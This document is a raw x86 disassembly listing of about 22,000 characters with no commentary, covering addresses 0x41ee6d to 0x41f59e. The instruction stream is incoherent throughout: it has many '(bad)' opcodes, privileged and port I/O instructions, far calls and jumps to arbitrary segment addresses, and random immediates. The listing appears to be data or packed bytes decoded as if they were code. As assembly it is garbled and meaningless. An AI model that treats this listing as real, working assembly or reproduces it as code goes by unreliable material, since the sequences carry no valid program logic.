  41ee6d:	clc    
  41ee6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee6f:	mov    dh,0x3a
  41ee71:	mov    eax,0x30ccd156
  41ee76:	adc    ebx,DWORD PTR [esi]
  41ee78:	push   esi
  41ee79:	call   0xb1f2db16
  41ee7e:	mov    al,0x3f
  41ee80:	std    
  41ee81:	xor    BYTE PTR [ebx+esi*2-0x5d],ch
  41ee85:	cmc    
  41ee86:	mov    dh,0x16
  41ee88:	cmp    cl,BYTE PTR [edi-0x54]
  41ee8b:	xchg   ecx,eax
  41ee8c:	push   ebp
  41ee8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8e:	daa    
  41ee8f:	lods   eax,DWORD PTR ds:[esi]
  41ee90:	cmp    bl,BYTE PTR [edi+0xf]
  41ee93:	clc    
  41ee94:	sbb    BYTE PTR [eax+edi*8],0x67
  41ee98:	lds    eax,FWORD PTR [edi+0x72]
  41ee9b:	dec    ebp
  41ee9c:	xchg   edx,eax
  41ee9d:	shl    BYTE PTR [ecx-0x52],1
  41eea0:	push   ebx
  41eea1:	call   0x56f11dc5
  41eea6:	jb     0x41eec3
  41eea8:	lahf   
  41eea9:	and    BYTE PTR ds:0x1f42672d,bh
  41eeaf:	ror    BYTE PTR [edx-0x14],cl
  41eeb2:	stc    
  41eeb3:	lods   eax,DWORD PTR ds:[esi]
  41eeb4:	dec    ecx
  41eeb5:	pop    edi
  41eeb6:	sub    esp,DWORD PTR [ebx+0x1d]
  41eeb9:	sbb    BYTE PTR [ebp+0x31],dl
  41eebc:	xchg   ebx,eax
  41eebd:	call   0x535c:0xd214f982
  41eec4:	and    cl,bl
  41eec6:	sahf   
  41eec7:	sti    
  41eec8:	rcl    BYTE PTR [edx],1
  41eeca:	data16 rol dh,0x7a
  41eece:	inc    ebp
  41eecf:	fidivr DWORD PTR [ebx]
  41eed1:	mov    edx,0x77ed0ba7
  41eed6:	pop    edx
  41eed7:	xor    eax,0x17fb55db
  41eedc:	retf   
  41eedd:	int3   
  41eede:	pop    ss
  41eedf:	loop   0x41ef07
  41eee1:	sar    BYTE PTR [ecx-0x4e],0x5
  41eee5:	xor    eax,0x4a5eea49
  41eeea:	jae    0x41ef2f
  41eeec:	inc    esi
  41eeed:	xlat   BYTE PTR ds:[ebx]
  41eeee:	call   0xe09566ea
  41eef3:	das    
  41eef4:	fadd   st,st(1)
  41eef6:	leave  
  41eef7:	popf   
  41eef8:	add    ebx,esi
  41eefa:	fstp   QWORD PTR [ecx-0x37f4d118]
  41ef00:	repnz pop es
  41ef02:	jne    0x41eecf
  41ef04:	cmc    
  41ef05:	retf   
  41ef06:	in     eax,dx
  41ef07:	xchg   ecx,eax
  41ef08:	das    
  41ef09:	jmp    0x58e7:0xc29f8637
  41ef10:	mov    eax,0x715dd514
  41ef15:	out    0x66,al
  41ef17:	cmp    al,0xf1
  41ef19:	fwait
  41ef1a:	cmp    esp,DWORD PTR [ebx-0x7c6dd912]
  41ef20:	cmc    
  41ef21:	pop    ebp
  41ef22:	icebp  
  41ef23:	cld    
  41ef24:	sbb    esi,ebx
  41ef26:	iret   
  41ef27:	lea    edx,[esi+0x59]
  41ef2a:	mov    BYTE PTR [edi-0x30],bh
  41ef2d:	cld    
  41ef2e:	fld    DWORD PTR [eax]
  41ef30:	scas   eax,DWORD PTR es:[edi]
  41ef31:	and    BYTE PTR [esi-0x62],cl
  41ef34:	push   esp
  41ef35:	test   BYTE PTR [esi+0x67],ah
  41ef38:	push   edx
  41ef39:	popf   
  41ef3a:	xlat   BYTE PTR ds:[ebx]
  41ef3b:	jne    0x41ef49
  41ef3d:	shr    BYTE PTR [edi],0x6b
  41ef40:	ins    BYTE PTR es:[edi],dx
  41ef41:	cld    
  41ef42:	(bad)  
  41ef43:	mov    esp,0xb75b30ee
  41ef48:	std    
  41ef49:	cmp    al,0x82
  41ef4b:	dec    edi
  41ef4c:	xchg   BYTE PTR [ecx],dl
  41ef4e:	mov    esp,0x2127b2e5
  41ef53:	push   edi
  41ef54:	loop   0x41ef55
  41ef56:	add    ebp,DWORD PTR [eax-0x57]
  41ef59:	cmp    edx,DWORD PTR [di-0x4b]
  41ef5d:	test   DWORD PTR [ecx],ebx
  41ef5f:	push   ebp
  41ef60:	fisubr WORD PTR [esi]
  41ef62:	sbb    al,0x46
  41ef64:	gs sbb al,bh
  41ef67:	in     al,0x6
  41ef69:	xor    BYTE PTR [ebp+0x12b265da],bl
  41ef6f:	dec    edx
  41ef70:	stos   BYTE PTR es:[edi],al
  41ef71:	pop    ss
  41ef72:	adc    bh,BYTE PTR [edx-0x4b740812]
  41ef78:	bound  edx,QWORD PTR [edi+0x27c19ad2]
  41ef7e:	mov    al,ds:0xc84ed858
  41ef83:	imul   edi,DWORD PTR [eax-0x59],0x83b11444
  41ef8a:	int    0x10
  41ef8c:	loop   0x41efef
  41ef8e:	scas   eax,DWORD PTR es:[edi]
  41ef8f:	pusha  
  41ef90:	fsub   DWORD PTR [eax+0x3ceb118a]
  41ef96:	xchg   esi,eax
  41ef97:	stos   BYTE PTR es:[edi],al
  41ef98:	lahf   
  41ef99:	jmp    0x3b59c4c
  41ef9e:	push   ss
  41ef9f:	xchg   ebx,eax
  41efa0:	adc    cl,BYTE PTR [edx-0x2d]
  41efa3:	jmp    0xf837:0xdcee06b8
  41efaa:	sahf   
  41efab:	mov    eax,DWORD PTR [ebp+0x43]
  41efae:	pop    ebx
  41efaf:	inc    ebx
  41efb0:	mov    al,ds:0xf9c2a1a
  41efb5:	xchg   edi,eax
  41efb6:	lock adc DWORD PTR [esi],esp
  41efb9:	push   esi
  41efba:	jmp    0x6c9af23
  41efbf:	sbb    DWORD PTR [esi-0x2622049e],esp
  41efc5:	fild   WORD PTR [edi-0x29]
  41efc8:	out    dx,eax
  41efc9:	inc    esp
  41efca:	imul   ebp,DWORD PTR [ecx],0x4c9cf83
  41efd0:	push   0x4e6cccec
  41efd5:	xor    cl,BYTE PTR [ecx-0x27]
  41efd8:	jmp    0x41f053
  41efda:	addr16 (bad) 
  41efdc:	clc    
  41efdd:	stos   DWORD PTR es:[edi],eax
  41efde:	cmp    eax,0x932d5f12
  41efe3:	popf   
  41efe4:	and    DWORD PTR [eax+0x1a],eax
  41efe7:	push   esp
  41efe8:	jge    0x41f055
  41efea:	mov    ebp,0xcd3c69c9
  41efef:	mov    ebp,0x761926a1
  41eff4:	pusha  
  41eff5:	in     eax,dx
  41eff6:	sbb    eax,0x83211fc7
  41effb:	pop    esi
  41effc:	shl    BYTE PTR [ecx],0x51
  41efff:	mov    cl,0xc
  41f001:	lea    ebx,ds:0xf3decd2
  41f007:	push   ebx
  41f008:	fnstcw WORD PTR [ebx-0x63]
  41f00b:	mov    esi,0x500000d7
  41f010:	cmc    
  41f011:	into   
  41f012:	fst    DWORD PTR [eax+0x60]
  41f015:	(bad)  [esi]
  41f017:	mov    eax,0xb5c0aab4
  41f01c:	pop    ss
  41f01d:	cmp    BYTE PTR [edi],bh
  41f01f:	fld    QWORD PTR [edx+0x6f1666fd]
  41f025:	xchg   ecx,eax
  41f026:	jbe    0x41f052
  41f028:	int3   
  41f029:	pop    edi
  41f02a:	sar    BYTE PTR [bx+si+0x10],cl
  41f02e:	lds    ecx,FWORD PTR [esi+0x68]
  41f031:	into   
  41f032:	inc    eax
  41f033:	fimul  DWORD PTR [ebx+0x68]
  41f036:	pop    ds
  41f037:	lods   al,BYTE PTR ds:[esi]
  41f038:	aaa    
  41f039:	mov    ah,0xa5
  41f03b:	mov    edi,0x654989f3
  41f040:	cli    
  41f041:	adc    al,0xd8
  41f043:	arpl   WORD PTR [esi],di
  41f045:	aaa    
  41f046:	mov    ebp,0x694476c9
  41f04b:	rol    DWORD PTR [ebp-0xa],0xcb
  41f04f:	push   es
  41f050:	xor    eax,0xb5f34b38
  41f055:	push   ds
  41f056:	and    BYTE PTR [ecx-0x1dbb2c3d],0x9
  41f05d:	out    0x50,eax
  41f05f:	or     edx,ebp
  41f061:	mov    DWORD PTR gs:[ecx],eax
  41f064:	test   BYTE PTR [edi-0x71],cl
  41f067:	xchg   edi,eax
  41f068:	call   0xc05ec140
  41f06d:	push   0x65
  41f06f:	inc    ebx
  41f070:	xchg   ecx,eax
  41f071:	ins    BYTE PTR es:[edi],dx
  41f072:	sub    al,0x7d
  41f074:	in     eax,dx
  41f075:	jns    0x41f0ad
  41f077:	test   DWORD PTR [ebp+0x39c10c5c],0xb42f0284
  41f081:	and    bh,BYTE PTR [edi-0x7b]
  41f084:	enter  0x6bcb,0x95
  41f088:	sbb    ebp,DWORD PTR [ecx]
  41f08a:	call   0x937024de
  41f08f:	das    
  41f090:	int3   
  41f091:	push   ds
  41f092:	popa   
  41f093:	xchg   ebx,eax
  41f094:	cld    
  41f095:	sbb    ch,0x8f
  41f098:	ja     0x41f02d
  41f09a:	xchg   ebx,eax
  41f09b:	xchg   ebp,eax
  41f09c:	mov    ds:0x846609e8,al
  41f0a1:	lock dec edx
  41f0a3:	inc    eax
  41f0a4:	pop    ebp
  41f0a5:	std    
  41f0a6:	cld    
  41f0a7:	add    DWORD PTR [edx],eax
  41f0a9:	inc    ebp
  41f0aa:	or     eax,0x5d185ddd
  41f0af:	adc    bh,BYTE PTR [edi-0x57a78bd2]
  41f0b5:	mul    al
  41f0b7:	adc    eax,0xb878dd39
  41f0bc:	pop    esp
  41f0bd:	lods   al,BYTE PTR ds:[esi]
  41f0be:	jl     0x41f0ff
  41f0c0:	mov    WORD PTR [eax+0x7f],?
  41f0c3:	xor    edi,DWORD PTR [ebp+0x40]
  41f0c6:	stos   DWORD PTR es:[edi],eax
  41f0c7:	mov    eax,ds:0xdef0bbe
  41f0cc:	ins    BYTE PTR es:[edi],dx
  41f0cd:	pushf  
  41f0ce:	and    eax,0xbdca916d
  41f0d3:	ja     0x41f126
  41f0d5:	pop    es
  41f0d6:	fld    TBYTE PTR [eax]
  41f0d8:	gs push cs
  41f0da:	jecxz  0x41f119
  41f0dc:	cmp    dl,BYTE PTR [ebp-0x3eb9c60e]
  41f0e2:	in     eax,dx
  41f0e3:	push   ebx
  41f0e4:	repnz dec eax
  41f0e6:	das    
  41f0e7:	fild   WORD PTR [edi+ebp*8]
  41f0ea:	popa   
  41f0eb:	adc    BYTE PTR [edx+edi*1+0x23],0xd5
  41f0f0:	popa   
  41f0f1:	sahf   
  41f0f2:	idiv   BYTE PTR [ebx]
  41f0f4:	cmp    DWORD PTR [ebx+0x505df81],ebp
  41f0fa:	inc    ecx
  41f0fb:	adc    eax,0xef5668c4
  41f100:	pop    eax
  41f101:	out    0x6b,eax
  41f103:	ja     0x41f161
  41f105:	fnstcw WORD PTR [eax-0x30f57078]
  41f10b:	inc    ecx
  41f10c:	bound  esi,QWORD PTR [ebx-0x35]
  41f10f:	jp     0x41f171
  41f111:	cmp    dh,BYTE PTR [ebx-0x9]
  41f114:	push   ds
  41f115:	sahf   
  41f116:	add    DWORD PTR [edx+0x1e],edx
  41f119:	cdq    
  41f11a:	inc    ebx
  41f11b:	or     ebx,DWORD PTR [ebx+0x7f]
  41f11e:	mov    ebx,0x916ea582
  41f123:	inc    esp
  41f124:	hlt    
  41f125:	nop
  41f126:	or     BYTE PTR [eax],cl
  41f128:	jg     0x41f19a
  41f12a:	xor    DWORD PTR [eax-0xef850a9],ebx
  41f130:	xor    DWORD PTR [edx-0x4f4355c9],ebp
  41f136:	in     al,0x9a
  41f138:	dec    edx
  41f139:	in     eax,0x57
  41f13b:	pop    ebx
  41f13c:	sbb    BYTE PTR [esi],cl
  41f13e:	adc    al,0xcf
  41f140:	dec    ebx
  41f141:	stc    
  41f142:	cmp    DWORD PTR ds:0xae8bf188,0xffffff90
  41f149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f14a:	jp     0x41f1c7
  41f14c:	mov    dl,BYTE PTR [eax]
  41f14e:	lock adc al,0x55
  41f151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f152:	scas   eax,DWORD PTR es:[edi]
  41f153:	retf   
  41f154:	adc    ebx,0xffffff9b
  41f157:	cmp    dh,BYTE PTR [ebp-0x103adc4f]
  41f15d:	pop    esp
  41f15e:	cmp    al,cl
  41f160:	loop   0x41f150
  41f162:	fistp  DWORD PTR [edx+0x42ac9f8]
  41f168:	or     bl,BYTE PTR [edi]
  41f16a:	mov    dh,0x7
  41f16c:	push   edi
  41f16d:	dec    edi
  41f16e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f16f:	lea    ebx,[ecx-0x4]
  41f172:	push   eax
  41f173:	popa   
  41f174:	inc    ecx
  41f175:	stos   BYTE PTR es:[edi],al
  41f176:	mov    edx,0x87c8a0dc
  41f17b:	(bad)  
  41f17d:	in     eax,0xcb
  41f17f:	push   0xffffffb4
  41f181:	adc    al,0xf1
  41f183:	dec    esp
  41f184:	and    BYTE PTR [edx-0xc],dl
  41f187:	ins    BYTE PTR es:[edi],dx
  41f188:	and    ah,ch
  41f18a:	cmp    BYTE PTR fs:[ebx-0x17163626],cl
  41f191:	and    al,ch
  41f193:	jnp    0x41f1dc
  41f195:	out    0x3d,al
  41f197:	sbb    edx,DWORD PTR [edx]
  41f199:	xor    edi,DWORD PTR [edi+0x7f]
  41f19c:	dec    edx
  41f19d:	(bad)  
  41f19e:	(bad)  
  41f19f:	sbb    bl,BYTE PTR [eax]
  41f1a1:	imul   edx,DWORD PTR [ecx+ebx*8+0x2e],0x76071b11
  41f1a9:	mov    eax,0xe964d1d1
  41f1ae:	sbb    DWORD PTR [edx],ecx
  41f1b0:	jmp    0x41f1d9
  41f1b2:	sbb    al,0xe3
  41f1b4:	sar    BYTE PTR [ebx],cl
  41f1b6:	aad    0xe9
  41f1b8:	(bad)  
  41f1b9:	sti    
  41f1ba:	jg     0x41f13e
  41f1bc:	inc    eax
  41f1bd:	push   eax
  41f1be:	xor    DWORD PTR [ebx-0x31],0xbb4675ef
  41f1c5:	add    al,0x95
  41f1c7:	or     BYTE PTR [ecx],0x61
  41f1ca:	fsub   st(1),st
  41f1cc:	pop    esp
  41f1cd:	or     al,0x74
  41f1cf:	mov    esp,0xd04b5be1
  41f1d4:	add    al,ch
  41f1d6:	xor    cl,BYTE PTR [edi]
  41f1d8:	ror    DWORD PTR [ebp+0x7968c3ca],0xfc
  41f1df:	xchg   esp,eax
  41f1e0:	mov    dl,0x6c
  41f1e2:	test   al,0xc6
  41f1e4:	xor    ch,BYTE PTR [eax]
  41f1e6:	mov    dh,0x3b
  41f1e8:	push   ecx
  41f1e9:	dec    esp
  41f1ea:	(bad)  
  41f1eb:	cli    
  41f1ec:	jnp    0x41f1e2
  41f1ee:	and    DWORD PTR [esi],ecx
  41f1f0:	or     eax,0x754d7c32
  41f1f5:	xor    ah,0x2c
  41f1f8:	sbb    al,BYTE PTR [ebx+0x38aa0edf]
  41f1fe:	cmp    eax,0xbc16cf0e
  41f203:	xor    dh,BYTE PTR [edi-0x21]
  41f206:	outs   dx,DWORD PTR ds:[esi]
  41f207:	retf   
  41f208:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f209:	(bad)  
  41f20a:	cmc    
  41f20b:	fnsave [edi+0x1ae10d3c]
  41f211:	or     bl,bl
  41f213:	push   esi
  41f214:	addr16 and eax,esp
  41f217:	add    BYTE PTR [ebp-0x667c3e0e],ch
  41f21d:	scas   eax,DWORD PTR es:[edi]
  41f21e:	and    edx,DWORD PTR [ecx+esi*2-0x4e]
  41f222:	loope  0x41f22b
  41f224:	out    dx,eax
  41f225:	idiv   BYTE PTR ds:0x5a237e50
  41f22b:	into   
  41f22c:	fld    DWORD PTR ds:0x434f8346
  41f232:	rcl    DWORD PTR ds:0x58b55094,cl
  41f238:	loop   0x41f204
  41f23a:	push   cs
  41f23b:	ja     0x41f20d
  41f23d:	sbb    al,dh
  41f23f:	mov    eax,0x803389e0
  41f244:	pushf  
  41f245:	jp     0x41f298
  41f247:	ins    DWORD PTR es:[edi],dx
  41f248:	fstp   DWORD PTR [eax]
  41f24a:	dec    esi
  41f24b:	cli    
  41f24c:	dec    edx
  41f24d:	out    dx,eax
  41f24e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f24f:	sahf   
  41f250:	lahf   
  41f251:	cli    
  41f252:	cdq    
  41f253:	sti    
  41f254:	fwait
  41f255:	call   0x9853:0x4c435ce0
  41f25c:	lea    ecx,[eax]
  41f25e:	adc    ebx,DWORD PTR [edx+0x4]
  41f261:	push   0x20ee828f
  41f266:	ins    DWORD PTR es:[edi],dx
  41f267:	(bad)  
  41f268:	sub    al,0x5f
  41f26a:	or     DWORD PTR [edx-0x6f6ddfc4],0x1a
  41f271:	add    bl,dl
  41f273:	xchg   edi,eax
  41f274:	inc    ebp
  41f275:	repz adc ecx,esi
  41f278:	mov    es,WORD PTR [eax+0x4402e7ee]
  41f27e:	cmp    al,0x4f
  41f280:	inc    esi
  41f281:	mov    ch,0x5
  41f283:	xchg   BYTE PTR ds:0x761aa38d,ah
  41f289:	xchg   ecx,eax
  41f28a:	or     ah,ch
  41f28c:	xchg   ebx,eax
  41f28d:	lahf   
  41f28e:	cli    
  41f28f:	pushf  
  41f290:	shl    esp,0x87
  41f293:	aam    0x86
  41f295:	repz add bl,BYTE PTR [edx-0x353ca110]
  41f29c:	mov    ecx,0x29505c96
  41f2a1:	xchg   BYTE PTR [eax+0x67],bl
  41f2a4:	mov    al,ds:0x6e3571e2
  41f2a9:	pop    ebx
  41f2aa:	lods   al,BYTE PTR ds:[esi]
  41f2ab:	out    dx,eax
  41f2ac:	retf   0x5e56
  41f2af:	call   0x405d:0xa320182c
  41f2b6:	or     esi,DWORD PTR [ecx+0x3c51129a]
  41f2bc:	sub    bh,BYTE PTR [eax-0x42a27f4a]
  41f2c2:	(bad)  
  41f2c3:	and    DWORD PTR [edx-0x1],ecx
  41f2c6:	jo     0x41f285
  41f2c8:	mov    ds:0xb019eccc,eax
  41f2cd:	push   es
  41f2ce:	cmp    DWORD PTR [edi+0x31],eax
  41f2d1:	nop
  41f2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2d3:	pop    esp
  41f2d4:	inc    eax
  41f2d5:	dec    ecx
  41f2d6:	push   0xffffffe2
  41f2d8:	bswap  edi
  41f2da:	xchg   ebx,eax
  41f2db:	out    0x6,eax
  41f2dd:	push   ds
  41f2de:	sar    bl,0xb4
  41f2e1:	sub    ecx,DWORD PTR [edi-0x3e]
  41f2e4:	add    eax,0xdfd6505f
  41f2e9:	mov    al,ds:0x8b3947b1
  41f2ee:	inc    ecx
  41f2ef:	and    eax,0x9b3d5794
  41f2f4:	sub    DWORD PTR [esi],0xd4572487
  41f2fa:	push   ss
  41f2fb:	test   al,0xeb
  41f2fd:	jbe    0x41f309
  41f2ff:	lods   eax,DWORD PTR ds:[esi]
  41f300:	sti    
  41f301:	push   ecx
  41f302:	in     eax,0x2d
  41f304:	jmp    0x41f351
  41f306:	nop
  41f307:	xlat   BYTE PTR ds:[ebx]
  41f308:	loopne 0x41f338
  41f30a:	ds pop ebp
  41f30c:	lods   al,BYTE PTR ds:[esi]
  41f30d:	or     BYTE PTR [edx+0x41],ah
  41f310:	cli    
  41f311:	push   0x412ebd81
  41f316:	fmul   QWORD PTR [eax+0x14]
  41f319:	xchg   ebx,eax
  41f31a:	mov    eax,ds:0x74b27e90
  41f31f:	repz pusha 
  41f321:	sbb    edi,0xffffffaf
  41f324:	and    al,BYTE PTR [ebp-0x434a32e2]
  41f32a:	adc    DWORD PTR [ebx],eax
  41f32c:	(bad)  
  41f32d:	(bad)  
  41f32e:	scas   al,BYTE PTR es:[edi]
  41f32f:	fldenv [esi-0x2dd1ef86]
  41f335:	jno    0x41f369
  41f337:	loope  0x41f356
  41f339:	fst    QWORD PTR [ebx-0x12b77ba7]
  41f33f:	call   0x65320886
  41f344:	ja     0x41f2dc
  41f346:	mov    edx,0x65c4b896
  41f34b:	lds    ecx,FWORD PTR [edx-0x6d]
  41f34e:	xor    BYTE PTR [esi+0x10],dl
  41f351:	push   ebp
  41f352:	imul   eax,DWORD PTR [ebp+0x77b9f30e],0x63
  41f359:	adc    eax,0x9c1ee18a
  41f35e:	vpcmpeqw xmm3,xmm3,XMMWORD PTR [ecx+0x13bc3629]
  41f366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f367:	ins    DWORD PTR es:[edi],dx
  41f368:	xchg   ecx,eax
  41f369:	into   
  41f36a:	nop
  41f36b:	pop    ecx
  41f36c:	add    bh,al
  41f36e:	jl     0x41f36b
  41f370:	cdq    
  41f371:	stos   BYTE PTR es:[edi],al
  41f372:	or     eax,0x2ba7632c
  41f377:	dec    edx
  41f378:	inc    eax
  41f379:	and    ah,cl
  41f37b:	scas   al,BYTE PTR es:[edi]
  41f37c:	pop    ss
  41f37d:	sbb    al,0x93
  41f37f:	lock jb 0x41f336
  41f382:	or     ch,BYTE PTR ds:0x2c3144aa
  41f388:	les    esp,FWORD PTR [eax-0x6f]
  41f38b:	sbb    ch,ah
  41f38d:	in     al,0x71
  41f38f:	jno    0x41f3b0
  41f391:	js     0x41f34e
  41f393:	jp     0x41f3c0
  41f395:	push   ebx
  41f396:	data16 (bad) 
  41f398:	push   0x3d255fe7
  41f39d:	mov    ebp,0xab6705e8
  41f3a2:	mov    ds:0x8468a90f,al
  41f3a7:	jmp    0x41f3b2
  41f3a9:	mov    ebx,0x634bf5ac
  41f3ae:	cwde   
  41f3af:	cli    
  41f3b0:	and    esi,DWORD PTR [ebx+0x1e]
  41f3b3:	add    BYTE PTR [ecx],0x81
  41f3b6:	stos   BYTE PTR es:[edi],al
  41f3b7:	push   ebp
  41f3b8:	sub    esp,eax
  41f3ba:	pop    ebp
  41f3bb:	int    0x12
  41f3bd:	rcr    BYTE PTR [bp+si],cl
  41f3c0:	(bad)  
  41f3c1:	dec    esi
  41f3c2:	ret    
  41f3c3:	sub    bh,BYTE PTR [esi-0xf5a9b39]
  41f3c9:	pop    ebx
  41f3ca:	pop    ebx
  41f3cb:	fstp   st(1)
  41f3cd:	pop    edi
  41f3ce:	xchg   edx,eax
  41f3cf:	xor    DWORD PTR [edx],ebp
  41f3d1:	add    ecx,edx
  41f3d3:	mov    DWORD PTR [esi],ebx
  41f3d5:	mov    ebx,ecx
  41f3d7:	inc    ebx
  41f3d8:	test   BYTE PTR [eax-0x27e9d8cf],dh
  41f3de:	lods   eax,DWORD PTR ds:[esi]
  41f3df:	xchg   edx,eax
  41f3e0:	xchg   edx,eax
  41f3e1:	jecxz  0x41f3a7
  41f3e3:	dec    eax
  41f3e4:	xchg   esp,eax
  41f3e5:	inc    ecx
  41f3e6:	cmp    ebx,DWORD PTR [edx-0x111fef3e]
  41f3ec:	das    
  41f3ed:	(bad)  
  41f3ee:	hlt    
  41f3ef:	lods   al,BYTE PTR ds:[esi]
  41f3f0:	lods   al,BYTE PTR ds:[esi]
  41f3f1:	retf   0xeb8f
  41f3f4:	mov    esi,0x263928e0
  41f3f9:	(bad)  
  41f3fa:	pop    eax
  41f3fb:	pop    ecx
  41f3fc:	lock aaa 
  41f3fe:	mov    bh,0x8d
  41f400:	xor    eax,DWORD PTR [ebp+0x7b8ba19a]
  41f406:	repz inc edx
  41f408:	push   0x4a12505d
  41f40d:	xor    eax,DWORD PTR [esi-0x3466dcac]
  41f413:	xchg   ebx,eax
  41f414:	fnsave [eax+0x6f]
  41f417:	fnstcw WORD PTR [ebp+edx*2+0x10]
  41f41b:	fcom   QWORD PTR [ecx+0x28096d1f]
  41f421:	sub    BYTE PTR [esi+0x31fab32f],al
  41f427:	or     edi,DWORD PTR [ebp+eiz*8-0x3685459d]
  41f42e:	adc    al,0x6d
  41f430:	or     bl,BYTE PTR [edx+0x3f]
  41f433:	adc    al,0x9
  41f435:	jp     0x41f3db
  41f437:	nop
  41f438:	push   ebx
  41f439:	daa    
  41f43a:	rcl    DWORD PTR ds:[edi],1
  41f43d:	and    al,0xbe
  41f43f:	test   al,0x2
  41f441:	inc    edi
  41f442:	dec    eax
  41f443:	pop    ebx
  41f444:	or     al,BYTE PTR [edi+0x8]
  41f447:	test   DWORD PTR [ebx],ebx
  41f449:	xlat   BYTE PTR ds:[ebx]
  41f44a:	shld   DWORD PTR [edi-0x4f],ecx,cl
  41f44e:	in     al,dx
  41f44f:	or     al,0xc0
  41f451:	mov    DWORD PTR [ebp+edx*2-0x3bf4483f],ebp
  41f458:	jp     0x41f45f
  41f45a:	mov    cl,0x13
  41f45c:	push   cs
  41f45d:	push   ds
  41f45e:	ja     0x41f42f
  41f460:	pop    ebp
  41f461:	jge    0x41f43e
  41f463:	add    esp,DWORD PTR [eax+0x5678a564]
  41f469:	pavgw  mm6,QWORD PTR [eax+0x67cac5ab]
  41f470:	stos   BYTE PTR es:[edi],al
  41f471:	mov    ah,0x7d
  41f473:	loope  0x41f40a
  41f475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f476:	arpl   WORD PTR [bx],di
  41f479:	scas   eax,DWORD PTR es:[edi]
  41f47a:	xor    edx,ecx
  41f47c:	adc    DWORD PTR [ebp-0x75],0x2b
  41f480:	mov    WORD PTR [edx-0x65],fs
  41f483:	pop    ebp
  41f484:	xchg   esp,eax
  41f485:	fwait
  41f486:	push   ecx
  41f487:	or     ebp,0x89cd0be5
  41f48d:	xchg   esi,eax
  41f48e:	mov    edx,0x6259882f
  41f493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f494:	cmp    BYTE PTR [esi],0xab
  41f497:	adc    esi,ecx
  41f499:	lods   eax,DWORD PTR ds:[esi]
  41f49a:	mov    eax,0x85e4b52a
  41f49f:	lea    ecx,[eax]
  41f4a1:	in     eax,dx
  41f4a2:	sbb    edx,0x647a3b80
  41f4a8:	adc    edx,ecx
  41f4aa:	in     al,dx
  41f4ab:	jp     0x41f4e5
  41f4ad:	lds    esp,FWORD PTR [eax-0x12338804]
  41f4b3:	push   eax
  41f4b4:	mov    WORD PTR [esi-0xe52bc96],fs
  41f4ba:	pop    esp
  41f4bb:	retf   0x9256
  41f4be:	test   al,0x35
  41f4c0:	push   cs
  41f4c1:	add    edx,esp
  41f4c3:	add    al,0x23
  41f4c5:	mov    al,0x67
  41f4c7:	ror    BYTE PTR [eax+0x3b6bf205],0x3
  41f4ce:	dec    esi
  41f4cf:	repz (bad) 
  41f4d2:	xor    DWORD PTR [edi+0x6dc3a2fc],edx
  41f4d8:	loope  0x41f4c7
  41f4da:	ret    0xdea6
  41f4dd:	cld    
  41f4de:	(bad)  
  41f4df:	in     eax,dx
  41f4e0:	jno    0x41f50b
  41f4e2:	xor    eax,0xe80ad408
  41f4e7:	dec    esp
  41f4e8:	outs   dx,DWORD PTR ds:[esi]
  41f4e9:	in     al,dx
  41f4ea:	inc    eax
  41f4eb:	fimul  DWORD PTR [ecx+edi*4+0x12]
  41f4ef:	inc    ebp
  41f4f0:	jno    0x41f4f9
  41f4f2:	lods   al,BYTE PTR ds:[esi]
  41f4f3:	(bad)  
  41f4f4:	jmp    0x79f445ba
  41f4f9:	in     al,dx
  41f4fa:	jnp    0x41f55f
  41f4fc:	jmp    FWORD PTR [esi+0x5e]
  41f4ff:	call   FWORD PTR [esi]
  41f501:	pop    ss
  41f502:	aas    
  41f503:	mov    edx,0x1388715b
  41f508:	jns    0x41f507
  41f50a:	add    ecx,DWORD PTR ds:0x61a3b03e
  41f510:	adc    eax,0xd636ce44
  41f515:	out    0x1e,eax
  41f517:	arpl   WORD PTR cs:[ebx],si
  41f51a:	das    
  41f51b:	pop    esi
  41f51c:	iret   
  41f51d:	push   0x51223481
  41f522:	dec    edx
  41f523:	in     al,dx
  41f524:	retf   0x7a5a
  41f527:	pop    ss
  41f528:	cld    
  41f529:	xlat   BYTE PTR ds:[ebx]
  41f52a:	aam    0x5e
  41f52c:	leave  
  41f52d:	or     DWORD PTR [ecx+0x55],ebp
  41f530:	dec    ecx
  41f531:	enter  0xa853,0x46
  41f535:	leave  
  41f536:	sbb    DWORD PTR [edi+0x30],esp
  41f539:	inc    ecx
  41f53a:	xor    BYTE PTR [edx-0x1adf56c8],dh
  41f540:	xor    DWORD PTR [ecx-0x1b],ecx
  41f543:	push   edx
  41f544:	mov    al,0xe7
  41f546:	and    al,0x54
  41f548:	mov    cl,0x3b
  41f54a:	jae    0x41f510
  41f54c:	push   ebx
  41f54d:	sub    ebx,DWORD PTR [esi-0x373e0014]
  41f553:	sub    edi,DWORD PTR [ecx+0x1b]
  41f556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f557:	lock fcmovnu st,st(0)
  41f55a:	mov    DWORD PTR [edx+0x4e],ebx
  41f55d:	rol    BYTE PTR [ebp-0x7c5f736b],1
  41f563:	icebp  
  41f564:	xchg   edx,eax
  41f565:	inc    ebp
  41f566:	test   DWORD PTR [edx-0x4f],esi
  41f569:	rcl    BYTE PTR ds:0xe4c889b9,cl
  41f56f:	sbb    edx,ebp
  41f571:	rcr    BYTE PTR [ecx],0x8f
  41f574:	add    al,0xfb
  41f576:	and    BYTE PTR [ebp+0x29],bh
  41f579:	jns    0x41f588
  41f57b:	outs   dx,BYTE PTR ds:[esi]
  41f57c:	and    DWORD PTR [esi+0x58],edx
  41f57f:	pop    es
  41f580:	sbb    DWORD PTR [esi+0x53077095],esp
  41f586:	fwait
  41f587:	push   esp
  41f588:	ins    BYTE PTR es:[edi],dx
  41f589:	jmp    0xfc057d9a
  41f58e:	jne    0x41f57d
  41f590:	pop    esp
  41f591:	jle    0x41f53b
  41f593:	mov    ecx,0xb128bbfb
  41f598:	jmp    0x95bd02bf
  41f59d:	pop    ebp
  41f59e:	pushf  
